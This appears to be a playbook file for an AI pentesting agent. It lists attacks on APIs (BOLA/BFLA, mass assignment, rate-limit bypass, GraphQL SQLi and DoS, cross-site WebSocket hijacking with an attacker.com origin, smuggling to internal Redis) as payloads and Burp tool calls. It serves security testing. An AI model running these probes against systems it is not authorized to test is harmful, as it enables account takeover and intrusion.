---
name: playbook-api-advanced
description: Advanced API flaws — OWASP API Top 10+, GraphQL deep, gRPC-Web, JSON-RPC, WebSocket auth, SSE poisoning, REST→internal-RPC pivots. Load when target is API-first or has GraphQL/gRPC/WS traffic.
prerequisite: API surface confirmed — JSON dominant, /graphql, /grpc, WebSocket upgrade, or OpenAPI spec.
stop_condition: 12 calls, no auth bypass, no BFLA, no GraphQL anomaly, no WS hijack signal → return to router.
---

# Advanced API Playbook

## Decision tree

```
GraphQL endpoint?           → §2 first (highest hit rate when present)
WebSocket traffic?           → §4
gRPC-Web / JSON-RPC?         → §5
Standard REST only?          → §1 (BOLA/BFLA) and §3 (mass assignment)
```

## 1. OWASP API Top 10+ deep cuts

### 1.1 BOLA (Broken Object Level Auth) — beyond simple `?id=` swap

| Variant | Probe |
|---|---|
| Numeric ID | `test_auth_matrix` with sequential IDs |
| UUID predictability | UUIDv1 leaks MAC+time; ULID/Snowflake are time-sortable | Extract pattern, predict victim's |
| Composite key | `?org=1&user=2` — swap one, keep other |
| Object-property level | `PATCH /me {"role":"admin"}` — mass assignment at property |
| Hash-based | MD5/SHA of email used as ID — guess from leaked emails |
| GraphQL nested | `query { user(id: 1) { posts { id, owner { email } } } }` — pivot via relations |

### 1.2 BFLA (Broken Function Level Auth)

| Trick | Probe |
|---|---|
| HTTP method override | `X-HTTP-Method-Override: DELETE` on `POST /api/users/123` |
| Verb tampering | Try `PATCH`, `DELETE`, `PUT` where only `GET`/`POST` documented |
| Path-case confusion | `/api/Admin/users` vs `/api/admin/users` (some routers case-sensitive, auth not) |
| Trailing slash | `/api/admin` 403, `/api/admin/` 200 |
| Path traversal in API path | `/api/users/../admin/users` |
| Encoded slash | `/api/users%2f..%2fadmin` |
| Old version | `/api/v1/admin` exists, `/api/v2/admin` requires auth |
| Internal vs external | `api.target.com/admin` vs `internal-api.target.com/admin` (DNS pivot via `Host:` header) |

### 1.3 Mass assignment on creation/update

```python
# Probe with unexpected fields based on JS-revealed model
session_request(session, "PATCH", "/api/me",
    json_body={
      "name": "test",
      "role": "admin",            # privilege
      "is_verified": True,         # bypass verification
      "credit_balance": 999999,    # financial
      "user_id": 1,                # account takeover
      "owner_id": 1,
      "permissions": ["*"],
      "email_verified": True,
      "two_factor_enabled": False,
      "tenant_id": "victim-tenant",
    })
# Then GET /api/me — check which stuck
```

### 1.4 Rate-limit bypass on sensitive endpoints

| Bypass | Mechanism |
|---|---|
| `X-Forwarded-For` rotation | If rate limiter keys on it |
| Case-mutation in path | `/login` vs `/Login` — separate buckets in some impls |
| Trailing slash, query padding | `/login` vs `/login?x=1` |
| Different verb | `POST /login` rate-limited, `GET /login` not (but rejects login) — useful if action accepts both |
| Different host header | If load-balancer keys per Host |

## 2. GraphQL deep

### 2.1 Discovery

```python
test_graphql(session, url="/graphql")
test_graphql_deep(session, url="/graphql")
# Probes: introspection, suggestions, batching, aliases, depth
```

### 2.2 Specific attacks

| Attack | Payload sketch |
|---|---|
| Introspection enabled in prod | `{ __schema { types { name fields { name } } } }` |
| Field suggestion oracle | Bad field name → server suggests valid one (info leak) — test `_disable_introspection: true` configs |
| Alias DoS | `{ a1: user(id:1){...} a2: user(id:2){...} ... a1000: ... }` — test small N first, do not actually DoS |
| Batched query DoS | Send array of 100 queries — does server process all? Cap small. |
| Deep nesting DoS | `{ user { friends { friends { friends { ... }}}} }` — limit to depth 5 in test |
| CSRF on GET | If GraphQL accepts queries via GET → CSRF possible |
| Mutation auth bypass | Mutation without auth header — common gap |
| Mass-introspection of admin types | After introspection, find `Mutation.deleteUser`, `Query.adminUsers` and test |
| Direct SQLi in resolvers | `{ user(filter: "1' OR 1=1--") }` — args reach DB raw |
| IDOR via object relations | `{ post(id: 1) { author { email } } }` — author email of any post |
| Batching auth bypass | First query auths, subsequent in batch reuse session — sometimes wrong user |

### 2.3 Save-finding template
```python
save_finding(
    vuln_type="graphql_idor",  # or graphql_alias_dos, graphql_introspection
    severity="high",
    title="GraphQL nested IDOR exposes other users' emails via Post.author",
    description="...",
    url="https://target/graphql",
    evidence={"logger_index": N},
)
```

## 3. gRPC-Web / JSON-RPC

### 3.1 gRPC-Web detection
- `Content-Type: application/grpc-web+proto` or `application/grpc-web-text`
- Proto descriptors sometimes leaked via `/grpc.reflection.v1alpha.ServerReflection/...`

### 3.2 Probes
```python
# Reflection enabled?
session_request(session, "POST", "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
    headers={"Content-Type": "application/grpc-web+proto"},
    body=b"...crafted reflection request...")

# If reflection disabled, fish for service names from JS
search_history(query=".grpc.", in_response_body=True)
search_history(query="ServerReflection", in_response_body=True)
```

### 3.3 JSON-RPC method enum
```python
# Common patterns
session_request(session, "POST", "/rpc",
    json_body={"jsonrpc":"2.0","method":"system.listMethods","id":1})
session_request(session, "POST", "/rpc",
    json_body={"jsonrpc":"2.0","method":"rpc.discover","id":1})
# If neither, brute force common methods (admin.*, user.*, debug.*) — rate-limited probe only
```

## 4. WebSocket auth flaws

### 4.1 CSWSH (Cross-Site WebSocket Hijacking)

```python
websocket_connect(url="wss://target/ws", origin="https://attacker.com")
# Server accepts? → CSWSH possible — victim's browser would auto-attach cookies on upgrade
```

### 4.2 Auth-once-then-anything

Many WS protocols auth on UPGRADE, then trust all messages. Probes:
```python
# After connect, send messages from a different "user context"
websocket_send_message(conn_id, json={"action": "delete_user", "user_id": 99})
# If server doesn't re-auth per message → BFLA inside WS
```

### 4.3 Subscription auth gap
```python
# Subscribe to channels you shouldn't have access to
websocket_send_message(conn_id, json={"action":"subscribe","channel":"admin"})
websocket_send_message(conn_id, json={"action":"subscribe","channel":"user.OTHER_ID.notifications"})
```

### 4.4 Message-level injection

WS messages often skip WAF. Re-test SQLi/XSS payloads inside WS payloads where input eventually lands in DB or HTML.

## 5. Server-Sent Events (SSE)

| Attack | Probe |
|---|---|
| Stream auth gap | `EventSource` cross-origin — does server check Origin? |
| Push-channel hijack | Subscribe to other users' channel via path param |
| Output injection | Inject `\ndata: ATTACKER\n\n` if you control any text in stream |

## 6. REST → internal-RPC pivot

If smuggling (`playbook-pollution.md`) confirmed AND internal services on same network:
- Smuggle `GET /admin/users` from external to internal-only admin API
- Smuggle to `localhost:6379` (Redis), `localhost:9200` (Elasticsearch), `localhost:8500` (Consul)
- gopher:// SSRF if available — can speak Redis protocol over HTTP

This is where smuggling pays off for real chains.

## 7. API spec mining

If OpenAPI/Swagger spec exposed:
```python
parse_api_schema(url="/openapi.json")  # or /swagger.json, /api-docs
# Returns: full endpoint list, params, auth requirements
# Look for: endpoints marked "internal", "admin", "deprecated"
```

The undocumented-but-still-routed endpoints are gold:
- `/api/v1/admin/_internal/...` referenced in JS but not in spec
- Old versions kept alive (`/api/v0/...`)
- Webhook receivers (`/webhooks/<provider>/incoming`) often skip auth

## Burp MCP tool mapping

| Need | Tool |
|---|---|
| GraphQL | `test_graphql`, `test_graphql_deep` |
| WebSocket | `websocket_connect`, `websocket_send_message`, `get_websocket_history` |
| API schema | `parse_api_schema`, `extract_api_endpoints` |
| BOLA matrix | `test_auth_matrix` |
| Mass assignment | `test_mass_assignment` |
| Rate limit | `test_rate_limit` |

